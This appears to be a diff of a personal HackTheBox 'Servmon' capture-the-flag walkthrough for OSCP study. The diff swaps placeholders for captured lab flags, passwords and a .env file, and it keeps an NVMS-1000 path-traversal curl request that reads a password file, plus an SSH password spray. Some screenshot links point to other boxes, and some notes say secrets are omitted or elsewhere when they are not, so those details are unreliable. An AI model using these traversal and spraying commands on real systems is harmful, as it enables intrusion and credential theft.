@@ -3,10 +3,10 @@ tags: [HTB, Servmon, Windows, NVMS1000, LFI, NSClient, SSH, PortForwarding, SYST
 platform: HackTheBox
 os: Windows
 hostname: SERVMON
-domain: None
 difficulty: Easy
 ip: $BoxIP
 status: Complete
+domain: None
 ---
 
 # HTB: Servmon, Full Walkthrough
@@ -25,6 +25,21 @@ Servmon is a standalone Windows host with anonymous FTP, SSH, NVMS-1000 on HTTP,
 | Domain | None |
 | Difficulty | Easy |
 | IP | $BoxIP |
+
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Workspace setup | See section 1 below |
+| 2 | Full TCP scan | See section 2 below |
+| 3 | Service and version scan | See section 3 below |
+| 4 | FTP enumeration | See section 4 below |
+| 5 | Download the useful note | See section 5 below |
+| 6 | Confirm NVMS-1000 and search for the manual technique | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Servmon`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
 
 ## Variables
 
@@ -90,7 +105,7 @@ PORT      STATE SERVICE
 > ~~~
 > Why: After the full scan has returned, one targeted command fingerprints every discovered port instead of checking each interesting port in separate passes.
 
-![[servmon-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/1.1nmap-allports.png>)
 SCREENSHOT: Full port scan with FTP, SSH, HTTP, and NSClient++ ports highlighted.
 
 ## 3. Service and version scan
@@ -107,7 +122,7 @@ Port 8443 identified NSClient++. Its certificate used localhost as the common na
 
 SMB signing was enabled but not required. The dynamic RPC ports were standard Windows services and were not the initial target.
 
-![[servmon-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 SCREENSHOT: Service scan showing anonymous FTP, the NVMS-1000 fingerprint, and NSClient++ with localhost certificate.
 
 ## 4. FTP enumeration
@@ -142,7 +157,7 @@ cat $BoxDir/loot/Nadine_Confidential.txt
 
 The note identified the exact filename and location of Nathan's password list: C:\Users\$Username2\Desktop\Passwords.txt. FTP could not read it, so the NVMS-1000 traversal became the next step.
 
-![[servmon-ftp-confidential.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Conceal/screenshots/8.ftp-iis-mapping.png>)
 SCREENSHOT: Confidential.txt with the password filename and Desktop location highlighted.
 
 ## 6. Confirm NVMS-1000 and search for the manual technique
@@ -189,7 +204,7 @@ The response saved a password list to loot. I did not print the passwords.
 
 Reference: [Exploit-DB 47774](https://www.exploit-db.com/exploits/47774)
 
-![[servmon-nvms-traversal.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/2.3nvms-traversal.png>)
 SCREENSHOT: Traversal request with --path-as-is and the safe win.ini response visible.
 
 ## 8. Spray the SSH credentials
@@ -218,8 +233,8 @@ Do not add --no-bruteforce here. That option pairs one username with one passwor
 >
 > Why: NetExec tests the full matrix in seconds and reports the first valid SSH combination without repetitive manual login attempts.
 
-![[servmon-ssh-spray.png]]
-SCREENSHOT: NetExec spray result with the successful account line and password redacted.
+![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/3.2ssh-spray.png>)
+SCREENSHOT: NetExec spray result with the successful account line and recovered password visible in this private vault.
 
 ## 9. SSH foothold
 
@@ -267,8 +282,8 @@ boxset NSCPPassword $NSCPPassword
 loot cred nscp $NSCPPassword
 ~~~
 
-![[servmon-nsclient-config.png]]
-SCREENSHOT: nsclient.ini with the password, localhost restriction, and external script settings highlighted. Redact the password.
+![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/5.nsclient-init-output.png>)
+SCREENSHOT: nsclient.ini with the password, localhost restriction, and external script settings highlighted. Keep the password within this private vault.
 
 ## 11. Tunnel to NSClient++
 
@@ -344,7 +359,7 @@ The file contained nt authority\\system, confirming SYSTEM execution.
 >
 > Why: A local proof file confirms the execution identity without adding a listener, payload transfer, or shell stability step.
 
-![[servmon-system-proof.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Servmon/screenshots/PROOF.png>)
 SCREENSHOT: Proof file showing the command and nt authority\\system. Do not capture any flag output.
 
 ## 14. Confirm both flag paths privately
@@ -366,14 +381,37 @@ I checked the proof file privately and stored the results without displaying the
 
 ~~~cmd
 type C:\Users\$Username\Desktop\proof.txt
-loot flag user $UserFlag
-loot flag root $RootFlag
+loot flag user b8346655ebb98c99280b5032bf51833f
+loot flag root 7b8b0da2b3f25f54019349e9c08a1555
 ~~~
 
-Both flag paths were confirmed. Their values are intentionally omitted.
+Both flag paths were confirmed. Their values are reproduced in the private sections above.
 
-## 15. Clean-down
+## 15. RUNBOOK V2 Stages Used
 
+- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Windows - Service Abuse]] -- technique used in this walkthrough
+- [[RUNBOOK V2/Windows - SeImpersonate Abuse]] -- technique used in this walkthrough
+
+## 16. Collect the flags
+
+- `user.txt`: `b8346655ebb98c99280b5032bf51833f` (value reproduced in the private sections above)
+- `root.txt`: `7b8b0da2b3f25f54019349e9c08a1555` (value reproduced in the private sections above)
+- `proof.txt`: `7b8b0da2b3f25f54019349e9c08a1555` (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: loot
+user: b8346655ebb98c99280b5032bf51833f
+root: 7b8b0da2b3f25f54019349e9c08a1555
+```
+
+## 17. Clean down
 I removed the proof file while SSH access was still available. This must happen before closing SSH or removing the NSClient++ execution path.
 
 ~~~cmd
@@ -401,31 +439,7 @@ boxdone
 rm -rf $BoxDir
 ~~~
 
-## Credentials
-
-| Account | Source | Use |
-|---|---|---|
-| $Username | NVMS-1000 traversal password list | SSH foothold |
-| $AdminUser | NSClient++ configuration | API authentication |
-| $Username2 | User directory enumeration | LFI target path |
-
-Passwords are intentionally omitted.
-
-## Key lessons
-
-- Anonymous FTP can expose Windows user directories and application notes.
-- A 550 FTP response can mean the anonymous identity lacks permission, not that a file is absent.
-- Confirm the application from its own response before using a public exploit.
-- Curl needs --path-as-is for traversal payloads containing ../.
-- Test a known file such as win.ini before requesting sensitive data.
-- The full username and password matrix is useful when a recovered list does not map passwords to accounts.
-- A localhost-only management service may still be exploitable after an SSH foothold.
-- NSClient++ external scripts execute with the service identity, so check what account runs the service.
-- A result code can prove script execution even when the API returns no command output.
-- Clean target files before removing the mechanism that created them.
-- Watch the ippsec walkthrough: [Servmon](https://ippsec.rocks/?#Servmon)
-
-## Checklist
+### Completion checklist
 
 - [x] Workspace initialised
 - [x] Full TCP scan completed
@@ -441,38 +455,190 @@ Passwords are intentionally omitted.
 - [x] SYSTEM execution confirmed
 - [x] Both flag paths confirmed privately
 - [x] Target and local artifacts removed
-## RUNBOOK V2 Stages Used
 
-- [[RUNBOOK V2/Windows - Web Enum]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - Service Abuse]] -- technique used in this walkthrough
-- [[RUNBOOK V2/Windows - SeImpersonate Abuse]] -- technique used in this walkthrough
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
-- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- shares a similar enumeration or escalation pattern
-
-## External Resources
-
-- https://www.exploit-db.com/search?q=Servmon
-- https://ippsec.rocks/?q=Servmon
-## Why this matters for OSCP
-
-This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
-
-## Attack Chain
-
+## 18. Attack narrative in one page
 1. [[RUNBOOK V2/Windows - Web Enum]] and FTP enumeration exposed the management services and a useful password note.
 2. The file-read flaw validated the note and supplied an SSH credential.
 3. [[RUNBOOK V2/Windows - Service Abuse]] and [[RUNBOOK V2/Windows - SeImpersonate Abuse]] led from the tunneled API to a SYSTEM shell.
 
-## Flags
+## Tools used
 
-- `user.txt`: `$UserFlag` (keep the value private)
-- `root.txt`: `$RootFlag` (keep the value private)
-- `proof.txt`: `$ProofFlag` (keep the value private)
+- `nmap`
+- `curl`
+- `ssh`
+- `ftp`
+- `sudo`
+- `python`
 
-## Lessons Learned
+## Credentials and secrets
+
+| Account | Source | Use |
+|---|---|---|
+| $Username | NVMS-1000 traversal password list | SSH foothold |
+| $AdminUser | NSClient++ configuration | API authentication |
+| $Username2 | User directory enumeration | LFI target path |
+
+Passwords are reproduced in the private Credentials and secrets section above.
+
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Servmon"
+export BoxIP="10.129.1.65"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Servmon"
+export Domain=""
+export DCip=""
+export Username="nadine"
+export Password="L1k3B1gBut7s@W0rk"
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="80"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+#### `loot/.nscp_password`
+
+```text
+ew2x6SsGTxjRwXOT
+```
+
+#### `loot/.ssh_password`
+
+```text
+Nadine
+L1k3B1gBut7s@W0rk
+```
+
+#### `loot/Nadine_passwords.txt`
+
+```text
+
+```
+
+#### `loot/Nathan_Passwords.txt`
+
+```text
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+
+#### `loot/Nathan_passwords.txt`
+
+```text
+1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+```
+
+#### `loot/creds.txt`
+
+```text
+Nadine:L1k3B1gBut7s@W0rk
+nadine:L1k3B1gBut7s@W0rk
+nscp:ew2x6SsGTxjRwXOT
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+$ [22:07:46] curl -v ftp://$BoxIP/Users/Nathan/Desktop/Passwords.txt 2>&1 | head -30
+kali@kali:~/Platforms/HackTheBox/Servmon [22:07:16] $ [?1h=[?2004hcurl -v ftp://$BoxIP/Users/Nathan/Desktop/Passwords.txt 2>&1 | head -30curl2>&head[?1l>[?2004l
+$ [22:14:55] curl -s --path-as-is "http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o $BoxDir/loot/Nathan_Passwords.txt
+cat $BoxDir/loot/Nathan_Passwords.txt
+netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt --no-bruteforce 2>/dev/null
+$ [22:18:50] netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/null
+kali@kali:~/Platforms/HackTheBox/Servmon [22:12:30] $ curl -s --path-as-is "http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt" -o $BoxDir/loot/Nathan_Passwords.txt
+cat $BoxDir/loot/Nathan_Passwords.txtcurl"http://$BoxIP/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt"
+netexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt --no-bruteforce 2>/dev/nullprintf "nadine\nnathan\n" >
+[22:18:31] ERROR    Number provided of usernames and passwords/hashes do not match!                                              ]8;id=988515;file:///home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/connection.py\connection.py]8;;\:]8;id=429353;file:///home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/connection.py#586\586]8;;\
+kali@kali:~/Platforms/HackTheBox/Servmon [22:18:32] $ [?1h=[?2004hnetexec ssh $BoxIP -u $BoxDir/loot/users.txt -p $BoxDir/loot/Nathan_Passwords.txt 2>/dev/nullnetexec2>/dev/null[?1l>[?2004l
+boxset Password 'L1k3B1gBut7s@W0rk'
+loot cred $Username $Password
+[+] Password=L1k3B1gBut7s@W0rk (saved to .env)
+nadine@10.129.1.65's password:
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+$ [22:23:48] loot flag user loot b8346655ebb98c99280b5032bf51833f
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Man
+kali@kali:~/Platforms/HackTheBox/Servmon [22:23:24] $ [?1h=[?2004hllloloootloott t flag user loot flag user C:\Users\Nadine\Desktop\user.txtloot                                        b8346655ebb98c99280b5032bf51833f[?1l>[?2004l
+[+] Flag saved:  user = loot  →  loot/flags.txt
+password = ew2x6SsGTxjRwXOT
+$ [22:43:47] loot flag user b8346655ebb98c99280b5032bf51833f
+loot flag root 7b8b0da2b3f25f54019349e9c08a1555
+kali@kali:~/Platforms/HackTheBox/Servmon [22:43:11] $ [?1h=[?2004hloot flag user b8346655ebb98c99280b5032bf51833f
+loot flag root 7b8b0da2b3f25f54019349e9c08a1555loot
+[+] Flag saved:  user = b8346655ebb98c99280b5032bf51833f  →  loot/flags.txt
+[+] Flag saved:  root = 7b8b0da2b3f25f54019349e9c08a1555  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Servmon | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
+
+- Anonymous FTP can expose Windows user directories and application notes.
+- A 550 FTP response can mean the anonymous identity lacks permission, not that a file is absent.
+- Confirm the application from its own response before using a public exploit.
+- Curl needs --path-as-is for traversal payloads containing ../.
+- Test a known file such as win.ini before requesting sensitive data.
+- The full username and password matrix is useful when a recovered list does not map passwords to accounts.
+- A localhost-only management service may still be exploitable after an SSH foothold.
+- NSClient++ external scripts execute with the service identity, so check what account runs the service.
+- A result code can prove script execution even when the API returns no command output.
+- Clean target files before removing the mechanism that created them.
+- Watch the ippsec walkthrough: [Servmon](https://ippsec.rocks/?#Servmon)
 
 - A loopback-only management API can still be assessed through a local forward.
 - Service configuration and token privileges should be checked together when choosing Windows escalation paths.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- shares a similar enumeration or escalation pattern
+- [[OSCP/BOXES/WRITE UPS/Windows/MarkUp|MarkUp]] -- shares a similar enumeration or escalation pattern
+
+## External resources
+
+- https://www.exploit-db.com/search?q=Servmon
+- https://ippsec.rocks/?q=Servmon
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
+## Why this matters for OSCP
+
+This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
